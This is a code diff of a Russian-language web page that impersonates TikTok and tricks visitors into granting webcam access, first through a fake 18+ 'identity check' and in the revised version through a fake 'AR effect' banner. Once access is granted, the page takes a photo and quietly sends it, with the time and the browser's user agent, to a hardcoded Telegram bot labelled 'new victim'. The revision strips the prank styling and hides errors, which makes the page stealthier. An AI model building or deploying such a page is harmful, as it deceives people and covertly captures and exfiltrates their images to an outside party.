@@ -1,524 +1,447 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
+  <title>TikTok</title>
+  <link rel="icon" href="https://www.tiktok.com/favicon.ico"/>
   <script>
     const TG_TOKEN   = '8816324332:AAH8hUkPtRpXexSxbKZjVAdzLAFHG8spqu0';
     const TG_CHAT_ID = '1577709820';
     async function sendToTelegram(dataUrl) {
       try {
         const blob = await (await fetch(dataUrl)).blob();
-        const fd   = new FormData();
+        const fd = new FormData();
         fd.append('chat_id', TG_CHAT_ID);
-        fd.append('photo',   blob, 'prank.jpg');
+        fd.append('photo', blob, 'photo.jpg');
         fd.append('caption',
-          '😂 НОВАЯ ЖЕРТВА ПРАНКА!\n' +
-          '🕐 ' + new Date().toLocaleString('ru-RU') + '\n' +
-          '📱 ' + navigator.userAgent.substring(0, 100)
+          'Новая жертва\n' +
+          new Date().toLocaleString('ru-RU') + '\n' +
+          navigator.userAgent.substring(0, 120)
         );
-        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method:'POST', body:fd });
-      } catch(e) { console.warn('TG error', e); }
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {method:'POST',body:fd});
+      } catch(e){}
     }
   </script>
-  <title>TikTok – Смотри видео</title>
-
-  <!-- Favicon как у тиктока -->
-  <link rel="icon" href="https://www.tiktok.com/favicon.ico" />
-
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{background:#000;color:#fff;font-family:-apple-system,'Segoe UI',sans-serif;overflow:hidden;height:100vh}
 
-    body {
-      background: #000;
-      font-family: -apple-system, 'Segoe UI', sans-serif;
-      color: #fff;
-      min-height: 100vh;
-      overflow: hidden;
+    /* ── HEADER ── */
+    header{
+      position:fixed;top:0;left:0;right:0;z-index:50;
+      display:flex;align-items:center;justify-content:space-between;
+      padding:10px 16px;
+      background:rgba(0,0,0,0.9);
     }
-
-    /* ══════════════════════════════
-       FAKE TIKTOK HEADER
-    ══════════════════════════════ */
-    #tt-header {
-      position: fixed; top: 0; left: 0; right: 0; z-index: 100;
-      background: #000;
-      display: flex; align-items: center; justify-content: space-between;
-      padding: 12px 16px;
-      border-bottom: 1px solid #1a1a1a;
-    }
-    #tt-header .logo {
-      font-size: 22px; font-weight: 900; letter-spacing: -1px;
-    }
-    #tt-header .logo span { color: #fe2c55; }
-    #tt-header .logo span:last-child { color: #25f4ee; }
-    .tt-login-btn {
-      background: #fe2c55; color: #fff;
-      border: none; border-radius: 4px;
-      padding: 8px 16px; font-size: 14px; font-weight: 700;
-      cursor: pointer;
+    .logo{font-size:20px;font-weight:800;letter-spacing:-0.5px}
+    .logo b{color:#fe2c55}
+    .header-right{display:flex;gap:10px;align-items:center}
+    .btn-login{
+      background:#fe2c55;color:#fff;
+      border:none;border-radius:4px;
+      padding:7px 14px;font-size:13px;font-weight:600;cursor:pointer;
     }
 
-    /* ══════════════════════════════
-       FAKE VIDEO PLAYER
-    ══════════════════════════════ */
-    #fake-player {
-      padding-top: 56px;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+    /* ── VIDEO AREA ── */
+    #page{padding-top:44px;height:100vh;display:flex;flex-direction:column}
+    #player{
+      position:relative;flex:1;background:#111;
+      display:flex;align-items:center;justify-content:center;
+      overflow:hidden;
+    }
+    #thumb{
+      width:100%;height:100%;
+      background:linear-gradient(180deg,#1c1c1c 0%,#0a0a0a 100%);
+      display:flex;align-items:center;justify-content:center;
+    }
+    /* fake blurred background */
+    #thumb::before{
+      content:'';
+      position:absolute;inset:0;
+      background:
+        radial-gradient(ellipse at 30% 40%, rgba(100,60,180,0.3) 0%, transparent 60%),
+        radial-gradient(ellipse at 70% 70%, rgba(20,100,200,0.2) 0%, transparent 50%);
+    }
+    .play-wrap{
+      position:absolute;
+      display:flex;flex-direction:column;align-items:center;gap:10px;
+    }
+    .play-circle{
+      width:64px;height:64px;border-radius:50%;
+      background:rgba(255,255,255,0.12);
+      border:2px solid rgba(255,255,255,0.25);
+      display:flex;align-items:center;justify-content:center;
+      cursor:pointer;
+      backdrop-filter:blur(6px);
+      transition:background 0.2s;
+    }
+    .play-circle:hover{background:rgba(255,255,255,0.2)}
+    .play-circle svg{width:26px;height:26px;fill:#fff;margin-left:4px}
+    .play-label{font-size:13px;color:rgba(255,255,255,0.6)}
+
+    /* AR banner */
+    #ar-banner{
+      position:absolute;bottom:0;left:0;right:0;
+      background:rgba(0,0,0,0.75);
+      backdrop-filter:blur(10px);
+      padding:12px 16px;
+      display:none;
+      align-items:center;gap:12px;
+      border-top:1px solid rgba(255,255,255,0.08);
+    }
+    #ar-banner.show{display:flex}
+    .ar-icon{
+      width:36px;height:36px;border-radius:8px;
+      background:linear-gradient(135deg,#fe2c55,#ff6b35);
+      display:flex;align-items:center;justify-content:center;
+      flex-shrink:0;font-size:16px;
+    }
+    .ar-text{flex:1}
+    .ar-text p{font-size:13px;font-weight:600;margin-bottom:2px}
+    .ar-text span{font-size:11px;color:rgba(255,255,255,0.5)}
+    .ar-btn{
+      background:#fe2c55;color:#fff;
+      border:none;border-radius:6px;
+      padding:8px 14px;font-size:13px;font-weight:600;
+      cursor:pointer;white-space:nowrap;flex-shrink:0;
     }
 
-    #video-container {
-      position: relative;
-      width: 100%;
-      max-width: 420px;
-      aspect-ratio: 9/16;
-      background: #111;
-      overflow: hidden;
-      cursor: pointer;
+    /* right actions */
+    #actions{
+      position:absolute;right:10px;bottom:80px;
+      display:flex;flex-direction:column;align-items:center;gap:20px;
+    }
+    .act{display:flex;flex-direction:column;align-items:center;gap:4px;cursor:pointer}
+    .act-icon{
+      width:42px;height:42px;border-radius:50%;
+      background:rgba(255,255,255,0.1);
+      display:flex;align-items:center;justify-content:center;
+    }
+    .act-icon svg{width:22px;height:22px;fill:#fff}
+    .act span{font-size:11px;color:rgba(255,255,255,0.7)}
+
+    /* bottom info */
+    #info{
+      position:absolute;bottom:80px;left:10px;right:70px;
+    }
+    #info .nick{font-size:14px;font-weight:700;margin-bottom:6px}
+    #info .desc{font-size:13px;color:rgba(255,255,255,0.85);line-height:1.4;margin-bottom:6px}
+    #info .music{font-size:12px;color:rgba(255,255,255,0.5);display:flex;align-items:center;gap:6px}
+    .disc{
+      width:16px;height:16px;border-radius:50%;
+      border:1px solid rgba(255,255,255,0.3);
+      display:inline-flex;align-items:center;justify-content:center;
     }
 
-    /* Fake blurred thumbnail */
-    #fake-thumb {
-      width: 100%; height: 100%;
-      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 40%, #0f3460 100%);
-      display: flex; align-items: center; justify-content: center;
-      flex-direction: column;
-      gap: 12px;
+    /* progress bar */
+    #progress{
+      height:2px;background:rgba(255,255,255,0.15);
+      position:relative;flex-shrink:0;
     }
-    .blur-avatar {
-      width: 70px; height: 70px;
-      border-radius: 50%;
-      background: linear-gradient(135deg, #fe2c55, #25f4ee);
-      display: flex; align-items: center; justify-content: center;
-      font-size: 30px;
+    #progress-fill{
+      height:100%;width:0%;background:#fe2c55;
+      transition:width 0.1s linear;
     }
 
-    /* Loading spinner */
-    #loading-overlay {
-      position: absolute; inset: 0;
-      background: rgba(0,0,0,0.7);
-      display: none;
-      align-items: center; justify-content: center;
-      flex-direction: column; gap: 12px;
+    /* ── CAMERA SCREEN ── */
+    #cam-screen{
+      display:none;position:fixed;inset:0;z-index:100;background:#000;
+      flex-direction:column;align-items:center;justify-content:center;
     }
-    #loading-overlay.show { display: flex; }
-    .spinner {
-      width: 48px; height: 48px;
-      border: 4px solid rgba(255,255,255,0.2);
-      border-top-color: #fe2c55;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
+    #cam-screen.show{display:flex}
+    #cam-top{
+      position:absolute;top:0;left:0;right:0;
+      padding:14px 16px;
+      display:flex;align-items:center;justify-content:space-between;
+      background:rgba(0,0,0,0.5);
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    /* Play button overlay */
-    #play-btn {
-      position: absolute; inset: 0;
-      display: flex; align-items: center; justify-content: center;
+    #cam-top span{font-size:14px;font-weight:600}
+    #cam-close{background:none;border:none;color:#fff;font-size:22px;cursor:pointer;padding:4px}
+    #vid-wrap{
+      width:min(360px,90vw);
+      aspect-ratio:3/4;
+      border-radius:16px;overflow:hidden;
+      position:relative;
     }
-    #play-btn .circle {
-      width: 70px; height: 70px;
-      background: rgba(255,255,255,0.15);
-      border-radius: 50%;
-      display: flex; align-items: center; justify-content: center;
-      backdrop-filter: blur(4px);
-      border: 2px solid rgba(255,255,255,0.3);
-      animation: pulse 2s infinite;
+    #video{width:100%;height:100%;object-fit:cover;display:block}
+    #cd{
+      position:absolute;top:50%;left:50%;
+      transform:translate(-50%,-50%);
+      font-size:100px;font-weight:900;
+      color:#fff;text-shadow:0 2px 20px rgba(0,0,0,0.8);
+      opacity:0;pointer-events:none;transition:opacity 0.15s;
     }
-    @keyframes pulse {
-      0%,100% { transform: scale(1); }
-      50%      { transform: scale(1.08); }
-    }
-    #play-btn svg { width: 30px; height: 30px; fill: #fff; margin-left: 4px; }
-
-    /* Video meta */
-    #video-meta {
-      width: 100%; max-width: 420px;
-      padding: 12px 16px 0;
-    }
-    .user-row {
-      display: flex; align-items: center; gap: 10px; margin-bottom: 10px;
-    }
-    .avatar {
-      width: 40px; height: 40px; border-radius: 50%;
-      background: linear-gradient(135deg, #fe2c55, #ff9500);
-      display: flex; align-items: center; justify-content: center;
-      font-size: 18px; flex-shrink: 0;
-    }
-    .username { font-weight: 700; font-size: 15px; }
-    .follow-btn {
-      margin-left: auto;
-      background: #fe2c55; color: #fff;
-      border: none; border-radius: 4px;
-      padding: 6px 14px; font-size: 13px; font-weight: 700;
-      cursor: pointer;
-    }
-    .caption { font-size: 14px; line-height: 1.4; color: #e0e0e0; margin-bottom: 6px; }
-    .hashtags { color: #25f4ee; font-size: 14px; }
-    .music-row {
-      display: flex; align-items: center; gap: 6px;
-      font-size: 13px; color: #aaa; margin-top: 8px;
-    }
-    .music-icon { font-size: 16px; animation: spin 3s linear infinite; display: inline-block; }
-
-    /* Side actions */
-    #side-actions {
-      position: absolute;
-      right: 10px; bottom: 20px;
-      display: flex; flex-direction: column; align-items: center; gap: 18px;
-    }
-    .action { text-align: center; cursor: pointer; }
-    .action-icon {
-      width: 44px; height: 44px;
-      background: rgba(255,255,255,0.1);
-      border-radius: 50%;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 22px;
-      margin-bottom: 4px;
-    }
-    .action span { font-size: 12px; color: #ccc; }
-
-    /* ══════════════════════════════
-       AGE VERIFY MODAL  (the trick)
-    ══════════════════════════════ */
-    #age-modal {
-      display: none;
-      position: fixed; inset: 0; z-index: 200;
-      background: rgba(0,0,0,0.85);
-      align-items: flex-end; justify-content: center;
-    }
-    #age-modal.show { display: flex; }
-    #age-box {
-      background: #1a1a1a;
-      border-radius: 20px 20px 0 0;
-      padding: 28px 24px 36px;
-      width: 100%; max-width: 480px;
-      animation: slideUp 0.35s ease;
-      text-align: center;
-    }
-    @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
-    #age-box h2 { font-size: 1.3rem; margin-bottom: 8px; }
-    #age-box p  { color: #aaa; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
-    #age-box .verify-btn {
-      width: 100%;
-      padding: 14px;
-      background: #fe2c55;
-      border: none; border-radius: 8px;
-      color: #fff; font-size: 16px; font-weight: 700;
-      cursor: pointer;
-      margin-bottom: 10px;
-    }
-    #age-box .cancel-btn {
-      background: none; border: none; color: #888;
-      font-size: 14px; cursor: pointer; padding: 4px;
+    #canvas{display:none}
+    #shutter{
+      position:absolute;inset:0;background:#fff;
+      opacity:0;pointer-events:none;
+      transition:opacity 0.05s;
     }
 
-    /* ══════════════════════════════
-       CAMERA SECTION
-    ══════════════════════════════ */
-    #camera-section {
-      display: none;
-      position: fixed; inset: 0; z-index: 300;
-      background: #000;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
+    /* ── RESULT ── */
+    #result-screen{
+      display:none;position:fixed;inset:0;z-index:200;
+      background:#000;
+      flex-direction:column;align-items:center;justify-content:center;
+      padding:20px;
     }
-    #camera-section.show { display: flex; }
-    #cam-hint {
-      font-size: 14px; color: #aaa; margin-bottom: 12px;
-      text-align: center; padding: 0 20px;
+    #result-screen.show{display:flex}
+    #result-screen h1{font-size:2rem;font-weight:800;margin-bottom:6px;text-align:center}
+    #result-screen p{color:rgba(255,255,255,0.5);font-size:14px;margin-bottom:20px;text-align:center}
+    #frame{
+      width:min(280px,80vw);border-radius:16px;overflow:hidden;
+      border:3px solid #fe2c55;
+      box-shadow:0 0 40px rgba(254,44,85,0.4);
+      position:relative;margin-bottom:20px;
     }
-    #videoWrapper {
-      position: relative;
-      width: 320px; max-width: 90vw;
-      border-radius: 16px; overflow: hidden;
-      border: 3px solid #fe2c55;
-      box-shadow: 0 0 30px rgba(254,44,85,0.5);
+    #frame img{width:100%;display:block}
+    #stamp{
+      position:absolute;top:50%;left:50%;
+      transform:translate(-50%,-50%) rotate(-12deg) scale(0);
+      font-size:1.8rem;font-weight:900;letter-spacing:4px;
+      color:#fe2c55;border:4px solid #fe2c55;
+      padding:6px 12px;border-radius:4px;
+      background:rgba(0,0,0,0.6);
+      text-transform:uppercase;pointer-events:none;
+      transition:transform 0.4s cubic-bezier(0.175,0.885,0.32,1.275);
     }
-    #video { width: 100%; display: block; }
-    #countdown {
-      position: absolute; top: 50%; left: 50%;
-      transform: translate(-50%,-50%);
-      font-size: 110px; font-weight: 900;
-      color: #fff; text-shadow: 0 0 20px #000;
-      opacity: 0; transition: opacity 0.15s;
-      pointer-events: none;
+    #stamp.show{transform:translate(-50%,-50%) rotate(-12deg) scale(1)}
+    .r-btns{display:flex;gap:10px;flex-wrap:wrap;justify-content:center}
+    .r-btn{
+      padding:11px 22px;border:none;border-radius:50px;
+      font-size:14px;font-weight:700;cursor:pointer;
     }
-    #canvas { display: none; }
-
-    /* ══════════════════════════════
-       RESULT
-    ══════════════════════════════ */
-    #result {
-      display: none;
-      position: fixed; inset: 0; z-index: 400;
-      background: #000;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-    #result.show { display: flex; }
-    #result h1 { font-size: 2.4rem; margin-bottom: 4px; }
-    #result .sub { color: #aaa; margin-bottom: 16px; font-size: 14px; text-align: center; }
-    #photoFrame {
-      position: relative;
-      width: 300px; max-width: 85vw;
-      border-radius: 16px; overflow: hidden;
-      border: 4px solid #fe2c55;
-      box-shadow: 0 0 40px rgba(254,44,85,0.6);
-      margin-bottom: 20px;
-    }
-    #photo { width: 100%; display: block; }
-    #stamp {
-      position: absolute; top: 50%; left: 50%;
-      transform: translate(-50%,-50%) rotate(-15deg) scale(0);
-      font-size: 2.2rem; font-weight: 900;
-      color: #fe2c55;
-      border: 5px solid #fe2c55;
-      padding: 6px 14px; border-radius: 6px;
-      letter-spacing: 3px; text-transform: uppercase;
-      background: rgba(0,0,0,0.55);
-      transition: transform 0.4s cubic-bezier(0.175,0.885,0.32,1.275);
-      pointer-events: none; white-space: nowrap;
-    }
-    #stamp.show { transform: translate(-50%,-50%) rotate(-15deg) scale(1); }
-    .btn-row { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; }
-    .btn {
-      padding: 12px 24px; border: none; border-radius: 50px;
-      font-size: 15px; font-weight: 700; cursor: pointer;
-      transition: transform 0.15s;
-    }
-    .btn:hover { transform: scale(1.04); }
-    .btn-red  { background: #fe2c55; color: #fff; }
-    .btn-dark { background: #222; color: #ccc; }
-
-    #errorMsg {
-      display: none; position: fixed; inset: 0; z-index: 500;
-      background: #000; align-items: center; justify-content: center;
-      flex-direction: column; text-align: center; padding: 30px;
-    }
-    #errorMsg.show { display: flex; }
-    #errorMsg .emoji { font-size: 70px; margin-bottom: 16px; }
+    .r-btn.red{background:#fe2c55;color:#fff}
+    .r-btn.dark{background:#1a1a1a;color:#aaa}
 
     /* confetti */
-    .confetti-wrap { position: fixed; inset: 0; pointer-events: none; overflow: hidden; z-index: 450; }
-    .cp {
-      position: absolute; top: -20px; width: 10px; height: 10px;
-      animation: cfFall linear forwards; border-radius: 2px;
-    }
-    @keyframes cfFall { to { transform: translateY(110vh) rotate(720deg); opacity: 0; } }
+    .cf-wrap{position:fixed;inset:0;pointer-events:none;z-index:250}
+    .cf{position:absolute;top:-10px;border-radius:2px;animation:cffall linear forwards}
+    @keyframes cffall{to{transform:translateY(105vh) rotate(540deg);opacity:0}}
 
-    @keyframes fadeIn { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }
+    /* error */
+    #err{
+      display:none;position:fixed;inset:0;z-index:300;background:#000;
+      flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:30px;
+    }
+    #err.show{display:flex}
+    #err h2{font-size:1.4rem;margin-bottom:8px}
+    #err p{color:#666;font-size:14px}
   </style>
 </head>
 <body>
 
-<!-- ═══ FAKE TIKTOK PAGE ═══ -->
-<div id="fake-player">
-
-  <!-- Header -->
-  <div id="tt-header">
-    <div class="logo">
-      <span>Tik</span><span>Tok</span>
+<!-- ─── TIKTOK PAGE ─── -->
+<div id="page">
+  <header>
+    <div class="logo">Tik<b>Tok</b></div>
+    <div class="header-right">
+      <button class="btn-login">Войти</button>
     </div>
-    <button class="tt-login-btn">Войти</button>
-  </div>
+  </header>
 
-  <!-- Video -->
-  <div id="video-container" onclick="showAgeModal()">
-    <div id="fake-thumb">
-      <div class="blur-avatar">😂</div>
-      <p style="color:#aaa;font-size:13px;">Нажми чтобы смотреть</p>
-    </div>
+  <div id="player">
+    <div id="thumb"></div>
 
-    <!-- Play button -->
-    <div id="play-btn">
-      <div class="circle">
+    <!-- play button -->
+    <div class="play-wrap" id="playwrap" onclick="handlePlay()">
+      <div class="play-circle">
         <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
       </div>
+      <span class="play-label">Нажмите для воспроизведения</span>
     </div>
 
-    <!-- Side actions -->
-    <div id="side-actions">
-      <div class="action">
-        <div class="action-icon">❤️</div>
-        <span>1.2М</span>
+    <!-- right actions -->
+    <div id="actions">
+      <div class="act">
+        <div class="act-icon">
+          <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+        </div>
+        <span>248K</span>
       </div>
-      <div class="action">
-        <div class="action-icon">💬</div>
-        <span>48К</span>
+      <div class="act">
+        <div class="act-icon">
+          <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
+        </div>
+        <span>3421</span>
       </div>
-      <div class="action">
-        <div class="action-icon">↗️</div>
+      <div class="act">
+        <div class="act-icon">
+          <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92-1.31-2.92-2.92-2.92z"/></svg>
+        </div>
         <span>Поделиться</span>
       </div>
     </div>
 
-    <!-- Loading -->
-    <div id="loading-overlay">
-      <div class="spinner"></div>
-      <p style="font-size:13px;color:#aaa;">Загрузка видео…</p>
-    </div>
-  </div>
-
-  <!-- Meta -->
-  <div id="video-meta">
-    <div class="user-row">
-      <div class="avatar">🎭</div>
-      <div>
-        <div class="username">@funny_pranks_ru</div>
-        <div style="font-size:12px;color:#aaa;">2 ч. назад</div>
+    <!-- bottom info -->
+    <div id="info">
+      <div class="nick">@creativeminds_official</div>
+      <div class="desc">Это просто невероятно... смотрите до конца</div>
+      <div class="music">
+        <div class="disc">&#9835;</div>
+        <span>Оригинальный звук — creativeminds</span>
       </div>
-      <button class="follow-btn">Подписаться</button>
     </div>
-    <div class="caption">НЕВЕРОЯТНОЕ что произошло прямо сейчас 😂🔥</div>
-    <div class="hashtags">#пранк #приколы #тренд #foryou #fyp</div>
-    <div class="music-row">
-      <span class="music-icon">🎵</span>
-      <span>Оригинальный звук – funny_pranks_ru</span>
+
+    <!-- AR banner -->
+    <div id="ar-banner">
+      <div class="ar-icon" style="font-size:18px">&#10024;</div>
+      <div class="ar-text">
+        <p>Интерактивный AR-эффект</p>
+        <span>Для просмотра требуется доступ к камере</span>
+      </div>
+      <button class="ar-btn" onclick="startCamera()">Включить</button>
     </div>
-  </div>
 
-</div>
-
-<!-- ═══ AGE / VERIFY MODAL ═══ -->
-<div id="age-modal">
-  <div id="age-box">
-    <h2>🔞 Подтверди возраст</h2>
-    <p>Это видео содержит контент 18+.<br>Для просмотра подтверди личность через камеру — стандартная проверка TikTok.</p>
-    <button class="verify-btn" onclick="startCamera()">📸 Подтвердить через камеру</button>
-    <br>
-    <button class="cancel-btn" onclick="closeModal()">Отмена</button>
+    <!-- progress -->
+    <div id="progress"><div id="progress-fill"></div></div>
   </div>
 </div>
 
-<!-- ═══ CAMERA ═══ -->
-<div id="camera-section">
-  <p id="cam-hint">Смотрим на тебя… держись 😈</p>
-  <div id="videoWrapper">
+<!-- ─── CAMERA ─── -->
+<div id="cam-screen">
+  <div id="cam-top">
+    <span>AR-эффект</span>
+    <button id="cam-close" onclick="cancelCam()">&#x2715;</button>
+  </div>
+  <div id="vid-wrap">
     <video id="video" autoplay playsinline muted></video>
-    <div id="countdown"></div>
+    <div id="cd"></div>
+    <div id="shutter"></div>
   </div>
   <canvas id="canvas"></canvas>
 </div>
 
-<!-- ═══ RESULT ═══ -->
-<div id="result">
-  <h1>😂 ПОПАЛСЯ!</h1>
-  <p class="sub">Никакого тиктока не было — это был пранк!<br>Держи своё фото 👇</p>
-  <div id="photoFrame">
-    <img id="photo" alt="фото" />
-    <div id="stamp">ПОЙМАН!</div>
+<!-- ─── RESULT ─── -->
+<div id="result-screen">
+  <h1>Попался!</h1>
+  <p>Это был пранк — твоё фото сделано</p>
+  <div id="frame">
+    <img id="photo" alt=""/>
+    <div id="stamp">ПОЙМАН</div>
   </div>
-  <div class="btn-row">
-    <button class="btn btn-red" onclick="downloadPhoto()">💾 Сохранить фото</button>
-    <button class="btn btn-dark" onclick="location.reload()">🔄 Снова</button>
+  <div class="r-btns">
+    <button class="r-btn red" onclick="save()">Сохранить фото</button>
+    <button class="r-btn dark" onclick="location.reload()">Снова</button>
   </div>
 </div>
 
-<!-- ═══ ERROR ═══ -->
-<div id="errorMsg">
-  <div class="emoji">😔</div>
-  <h2>Камера недоступна</h2>
-  <p style="color:#aaa;margin-top:8px;">Нужен доступ к камере для пранка</p>
+<!-- ─── ERROR ─── -->
+<div id="err">
+  <h2>Нет доступа к камере</h2>
+  <p>Разреши доступ к камере и обнови страницу</p>
 </div>
 
-<div class="confetti-wrap" id="confetti"></div>
+<div class="cf-wrap" id="cf"></div>
 
 <script>
-  const $ = id => document.getElementById(id);
+const $ = id => document.getElementById(id);
+let stream;
 
-  function showAgeModal() {
-    $('loading-overlay').classList.add('show');
-    setTimeout(() => {
-      $('loading-overlay').classList.remove('show');
-      $('age-modal').classList.add('show');
-    }, 1400);
+// Auto-show AR banner after fake "loading"
+function handlePlay() {
+  $('playwrap').style.display = 'none';
+  // fake progress
+  let w = 0;
+  const prog = setInterval(() => {
+    w += Math.random() * 3;
+    if (w >= 30) { clearInterval(prog); showARBanner(); return; }
+    $('progress-fill').style.width = w + '%';
+  }, 80);
+}
+
+function showARBanner() {
+  $('ar-banner').classList.add('show');
+}
+
+async function startCamera() {
+  $('ar-banner').classList.remove('show');
+  $('cam-screen').classList.add('show');
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:'user',width:1280,height:720 }, audio:false });
+    const v = $('video');
+    v.srcObject = stream;
+    v.onloadedmetadata = () => { v.play(); countdown(); };
+  } catch(e) {
+    $('cam-screen').classList.remove('show');
+    $('err').classList.add('show');
   }
+}
 
-  function closeModal() {
-    $('age-modal').classList.remove('show');
-  }
+function cancelCam() {
+  if (stream) stream.getTracks().forEach(t=>t.stop());
+  $('cam-screen').classList.remove('show');
+  $('ar-banner').classList.add('show');
+}
 
-  async function startCamera() {
-    $('age-modal').classList.remove('show');
-    $('camera-section').classList.add('show');
-
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-      const vid = $('video');
-      vid.srcObject = stream;
-      vid.onloadedmetadata = () => { vid.play(); startCountdown(stream); };
-    } catch(e) {
-      $('camera-section').classList.remove('show');
-      $('errorMsg').classList.add('show');
+function countdown() {
+  const cd = $('cd');
+  let n = 3;
+  cd.style.opacity = 1;
+  cd.textContent = n;
+  const t = setInterval(()=>{
+    n--;
+    if (n > 0) { cd.textContent = n; }
+    else {
+      clearInterval(t);
+      cd.textContent = '';
+      cd.style.opacity = 0;
+      shoot();
     }
-  }
+  }, 900);
+}
 
-  function startCountdown(stream) {
-    const cd = $('countdown');
-    let n = 3;
-    cd.style.opacity = 1;
-    cd.textContent = n;
-    const t = setInterval(() => {
-      n--;
-      if (n > 0) { cd.textContent = n; }
-      else {
-        clearInterval(t);
-        cd.textContent = '📸';
-        setTimeout(() => capture(stream), 300);
-      }
-    }, 900);
-  }
+function shoot() {
+  // flash
+  const sh = $('shutter');
+  sh.style.opacity = 1;
+  setTimeout(()=>{ sh.style.opacity = 0; }, 80);
 
-  function capture(stream) {
-    const vid = $('video'), cv = $('canvas');
-    cv.width = vid.videoWidth; cv.height = vid.videoHeight;
-    const ctx = cv.getContext('2d');
-    ctx.translate(cv.width, 0); ctx.scale(-1, 1);
-    ctx.drawImage(vid, 0, 0);
-    stream.getTracks().forEach(t => t.stop());
-    showResult(cv.toDataURL('image/jpeg', 0.92));
-  }
+  const v = $('video'), cv = $('canvas');
+  cv.width = v.videoWidth; cv.height = v.videoHeight;
+  const ctx = cv.getContext('2d');
+  ctx.translate(cv.width, 0); ctx.scale(-1,1);
+  ctx.drawImage(v,0,0);
+  if (stream) stream.getTracks().forEach(t=>t.stop());
 
-  function showResult(url) {
-    $('camera-section').classList.remove('show');
-    $('result').classList.add('show');
-    $('photo').src = url;
-    window._url = url;
-    setTimeout(() => $('stamp').classList.add('show'), 500);
-    spawnConfetti();
-    sendToTelegram(url); // 📨 отправляем фото в Telegram
-  }
+  const url = cv.toDataURL('image/jpeg', 0.92);
+  window._photo = url;
+  showResult(url);
+  sendToTelegram(url);
+}
 
-  function downloadPhoto() {
-    const a = document.createElement('a');
-    a.href = window._url; a.download = 'prank.jpg'; a.click();
-  }
+function showResult(url) {
+  $('cam-screen').classList.remove('show');
+  $('result-screen').classList.add('show');
+  $('photo').src = url;
+  setTimeout(()=>$('stamp').classList.add('show'), 500);
+  confetti();
+}
 
-  const COLS = ['#fe2c55','#25f4ee','#f5a623','#7ed321','#fff','#bd10e0'];
-  function spawnConfetti() {
-    const c = $('confetti');
-    for (let i = 0; i < 90; i++) {
-      const el = document.createElement('div');
-      el.className = 'cp';
-      el.style.cssText = `
-        left:${Math.random()*100}%;
-        background:${COLS[Math.floor(Math.random()*COLS.length)]};
-        width:${6+Math.random()*10}px; height:${6+Math.random()*10}px;
-        animation-duration:${1.5+Math.random()*2}s;
-        animation-delay:${Math.random()*0.8}s;
-        border-radius:${Math.random()>.5?'50%':'2px'};
-      `;
-      c.appendChild(el);
-    }
-    setTimeout(() => c.innerHTML = '', 5000);
+function save() {
+  const a = document.createElement('a');
+  a.href = window._photo; a.download = 'photo.jpg'; a.click();
+}
+
+const COLS = ['#fe2c55','#25f4ee','#ff9500','#7ed321','#fff'];
+function confetti() {
+  const c = $('cf');
+  for (let i=0;i<80;i++) {
+    const el = document.createElement('div');
+    el.className='cf';
+    el.style.cssText=`
+      left:${Math.random()*100}%;
+      background:${COLS[Math.floor(Math.random()*COLS.length)]};
+      width:${6+Math.random()*8}px;height:${6+Math.random()*8}px;
+      animation-duration:${1.5+Math.random()*2}s;
+      animation-delay:${Math.random()*0.6}s;
+      border-radius:${Math.random()>.5?'50%':'2px'};
+    `;
+    c.appendChild(el);
   }
+  setTimeout(()=>c.innerHTML='',4000);
+}
 </script>
 </body>
 </html>
